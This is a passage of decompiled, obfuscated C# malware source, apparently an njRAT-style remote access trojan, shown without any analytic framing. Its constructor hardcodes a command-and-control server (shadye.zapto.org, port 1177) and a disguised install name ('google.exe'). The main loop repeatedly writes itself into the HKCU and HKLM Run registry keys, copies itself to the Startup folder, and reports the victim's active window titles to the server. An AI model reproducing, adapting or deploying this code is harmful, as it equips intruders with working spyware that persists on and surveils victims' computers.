		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			Mutex.OpenExisting(string_7);
			ProjectData.EndApp();
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			mutex_0 = new Mutex(initiallyOwned: true, string_7);
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
		object obj = new Thread(method_21, 1);
		NewLateBinding.LateCall(obj, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		if (string_1.Length > 0)
		{
			obj = new Thread(method_29, 1);
			NewLateBinding.LateCall(obj, (Type)null, "start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		try
		{
			gclass1_0 = new GClass1();
			obj = new Thread(gclass1_0.method_3, 1);
			NewLateBinding.LateCall(obj, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		int num = 0;
		int num2 = 0;
		string text2 = "";
		if (object_0 != null)
		{
			try
			{
				SystemEvents.add_SessionEnding((SessionEndingEventHandler)delegate
				{
					method_4();
				});
				method_15(1);
			}
			catch (Exception projectError9)
			{
				ProjectData.SetProjectError(projectError9);
				ProjectData.ClearProjectError();
			}
		}
		checked
		{
			while (true)
			{
				Thread.Sleep(1000);
				try
				{
					num++;
					num2++;
					if (num > 10)
					{
						num = 0;
						if (object_1 != null && Operators.CompareString(method_0(), text2, false) != 0)
						{
							text2 = method_0();
							if (text2 != null && text2.Length > 0)
							{
								method_19("act" + string_0 + text2);
							}
						}
					}
					if (num2 <= 7)
					{
						continue;
					}
					num2 = 0;
					try
					{
						object obj2 = NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array2 = new object[2] { string_8, true };
						object[] array3 = array2;
						bool[] array4 = new bool[2] { true, false };
						object obj3 = NewLateBinding.LateGet(obj2, (Type)null, "OpenSubKey", array3, (string[])null, (Type[])null, array4);
						if (array4[0])
						{
							string_8 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
						}
						object[] array5 = new object[2]
						{
							string_4,
							Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet((object)fileInfo_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" ..")
						};
						object[] array6 = array5;
						bool[] array7 = new bool[2] { true, false };
						NewLateBinding.LateCall(obj3, (Type)null, "SetValue", array6, (string[])null, (Type[])null, array7, true);
						if (array7[0])
						{
							string_4 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
						}
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
					}
					try
					{
						object obj4 = NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array8 = new object[2] { string_8, true };
						object[] array9 = array8;
						bool[] array7 = new bool[2] { true, false };
						object obj5 = NewLateBinding.LateGet(obj4, (Type)null, "OpenSubKey", array9, (string[])null, (Type[])null, array7);
						if (array7[0])
						{
							string_8 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array8[0]), typeof(string));
						}
						object[] array10 = new object[2]
						{
							string_4,
							Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet((object)fileInfo_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" ..")
						};
						object[] array11 = array10;
						bool[] array4 = new bool[2] { true, false };
						NewLateBinding.LateCall(obj5, (Type)null, "SetValue", array11, (string[])null, (Type[])null, array4, true);
						if (array4[0])
						{
							string_4 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array10[0]), typeof(string));
						}
					}
					catch (Exception projectError11)
					{
						ProjectData.SetProjectError(projectError11);
						ProjectData.ClearProjectError();
					}
					try
					{
						File.Copy(Conversions.ToString(NewLateBinding.LateGet((object)fileInfo_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + string_4 + ".exe", overwrite: true);
					}
					catch (Exception projectError12)
					{
						ProjectData.SetProjectError(projectError12);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError13)
				{
					ProjectData.SetProjectError(projectError13);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	[SpecialName]
	[CompilerGenerated]
	[DebuggerStepThrough]
	private void method_32(object object_3)
	{
		method_11((byte[])object_3);
	}

	public GClass0()
	{
		//IL_0012: Expected O, but got I4
		//IL_00a9: Expected O, but got I4
		//IL_00c5: Expected O, but got I4
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		Class7.emjVh6jz6A5Vw();
		base._002Ector();
		object_2 = 0;
		string_11 = "[endof]";
		gclass1_0 = null;
		string_10 = "Z29vZ2xl";
		string_9 = "0.4.1a";
		string_7 = "";
		mutex_0 = null;
		string_6 = "google.exe";
		string_5 = "TEMP";
		string_4 = "85ce27c90f0ba2b98ceb888e2ca7acde";
		string_3 = "shadye.zapto.org";
		string_2 = "1177";
		string_1 = "! My Picutre.SCR";
		string_0 = "|'|'|";
		object_0 = Conversions.ToBoolean("True");
		fileInfo_0 = new FileInfo(Assembly.GetExecutingAssembly().Location);
		object_1 = 0;
		tcpClient_0 = null;
		string_8 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
		computer_0 = new Computer();
	}
}
